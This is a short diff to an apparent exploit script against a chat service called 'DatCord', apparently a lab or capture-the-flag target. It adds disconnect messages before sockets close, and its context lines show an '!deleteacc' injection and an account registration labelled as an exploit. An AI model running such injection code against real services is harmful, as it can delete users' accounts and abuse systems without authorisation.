@@ -62,6 +62,8 @@ s.send(session.encrypt("!deleteacc".encode()))
 conf = s.recv(10240)
 s.send(session.encrypt("!deleteacc".encode()))
 print("[*] Injection completed. Terminating connection.\n")
+s.send(session.encrypt("!disconnect".encode()))
+s.close()
 
 """
 ##############################################################
@@ -77,6 +79,7 @@ registered = s.recv(10240)
 # client_help_msg = s.recv(10240)
 print(f"[*] Successfully registered DatCord account with password '{passw}'.\n")
 print(f"[*] Exploit completed. Beginning communication with DatCord.")
+s.send(session.encrypt("!disconnect".encode()))
 s.close()
 
 """
